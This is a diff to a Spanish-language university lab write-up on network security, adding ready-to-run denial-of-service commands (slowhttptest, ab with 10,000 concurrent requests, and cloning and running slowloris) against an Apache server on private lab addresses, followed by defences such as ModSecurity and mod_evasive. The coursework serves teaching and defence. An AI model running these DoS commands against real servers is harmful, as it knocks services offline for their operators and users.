@@ -195,16 +195,33 @@ Obtenga información "en tiempo real" sobre las conexiones de su máquina, así 
 > *Apartado incompleto.*
 
 Monitoremos nuestra infraestructura:
+
 ### APARTADO M
 ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas?
 ¿Y mediante un DoS de tipo reflective flooding attack?
+
 ### APARTADO N
 Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7).
 > `apt install apache2`
 
 > `curl https://www.alvarofreire.es/ > /var/www/html/index.html`
 
+1. Slowhttptest
+
 > `slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.49.54 -x 24 -p 3`
+
+2. Apache benchmarking
+
+> `ab -n 10000 -c 10000 http://10.11.49.55/`
+
+3. Slowloris
+
+> `git clone https://github.com/gkbrk/slowloris.git`
+
+> `cd slowloris`
+
+> `python3 slowloris.py 10.11.49.55 -s 500`
+
 1. ¿Cómo podría proteger dicho servicio ante este tipo de ataque?
 > Con un firewall de aplicaciones web como modsecurity.
 2. ¿Y si se produjese desde fuera de su segmento de red?
@@ -253,7 +270,8 @@ SecRuleEngine On
     #DOSLogDir           "/var/log/mod_evasive"
 </IfModule>
 ```
-
+- El comando para desabilitar es `a2dismod`.
+- 
 ## APARTADO P
 1. Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.
 > `whois -h whois.ripe.net UDC`
